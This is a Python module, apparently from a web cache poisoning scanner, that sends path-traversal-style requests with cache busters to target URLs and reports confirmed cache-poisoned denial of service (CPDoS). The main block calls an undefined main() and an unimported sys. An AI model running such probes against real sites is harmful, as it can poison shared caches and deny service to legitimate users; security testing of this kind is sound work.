#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
From 0xrth research
"""


from modules.utils import random, requests, configure_logger, Identify
import traceback
try:
    import httpx
except:
    print("httpx does not seem to be installed")

logger = configure_logger(__name__)


CONTENT_DELTA_RANGE = 500


def verify(req_main, url, url_cb, url_test, completed_path, p, s):
    try:
        completed_path = completed_path.encode("utf-8")
        url_with_raw_path = f"{url}{completed_path.decode('utf-8')}" if url[-1] == "/" else f"{url}/{completed_path.decode('utf-8')}"
        #print(url_with_raw_path)
        #print(url_with_raw_path)
        for _ in range(5):
            with httpx.Client(http2=False, verify=False) as client:
                req_verify = client.get(url_with_raw_path)

        req_cb = s.get(url_cb, verify=False, timeout=10, allow_redirects=False)
        #print(f"req_cb.status_code: {req_cb.status_code} | req_verify.status_code: {req_verify.status_code} | req_main.status_code: {req_main.status_code}")
        if req_cb.status_code == req_verify.status_code and req_cb.status_code != req_main.status_code:
            print(f"\033[31m └── [VULNERABILITY CONFIRMED]\033[0m | CPDoSError {req_main.status_code} > {req_cb.status_code} | \033[34m{url_cb}\033[0m | PAYLOAD: {url_test}")
    except requests.Timeout:
        #print(f"request timeout {url} {p}")
        pass
    except Exception as e:
        #traceback.print_exc()
        pass



def path_traversal_check(url, s, req_main, authent):
    try:
        range_exlusion = range(len(req_main.content) - CONTENT_DELTA_RANGE, len(req_main.content) + CONTENT_DELTA_RANGE)
        paths = [
        "cc\\..\\",
        "cc/../"
        ]
        for p in paths:
            cb = f"?cb={random.randrange(999)}"

            completed_path = f"{p}{cb}"
            url_test = f"{url}{p}{cb}" if url[-1] == "/" else f"{url}/{p}{cb}"
            url_cb = f"{url}{cb}"

            req_test = s.get(url_test, verify=False, timeout=10, allow_redirects=False)
            if req_test.status_code != req_main.status_code and req_test.status_code not in [403, 401]:
                print(f"\033[33m └── [INTERESTING BEHAVIOR]\033[0m | CPDoSError {req_main.status_code} > {req_test.status_code} | \033[34m{url_cb}\033[0m | PAYLOAD: {url_test}")
                verify(req_main, url, url_cb, url_test, completed_path, p, s)
            elif len(req_test.content) not in range_exlusion and req_test.status_code not in [403, 401]:
                print(f"\033[33m └── [INTERESTING BEHAVIOR]\033[0m | CPDoSError {len(req_main.content)}b > {len(req_test.content)}b | \033[34m{url_cb}\033[0m | PAYLOAD: {url_test}")
                verify(req_main, url, url_cb, url_test, completed_path, p, s)
    except requests.Timeout:
        #print(f"request timeout {url} {p}")
        pass
    except Exception as e:
        #traceback.print_exc()
        pass




if __name__ == "__main__":
    # file => python3 file.py f file.txt | single url => python3 file.py url.com
    s = requests.Session()
    s.headers.update(
                {
                    "User-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko",
                }
            )

    if len(sys.argv) == 2:
        url = sys.argv[1]
        main(url, s)
    elif len(sys.argv) == 3:
        input_file = sys.argv[2]
        with open(input_file, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
        for url in urls:
            main(url, s)
            print(f" {url}", end='\r')
    else:
        print("Usage:\n With file => python3 file.py f file.txt \n With single url => python3 file.py url.com")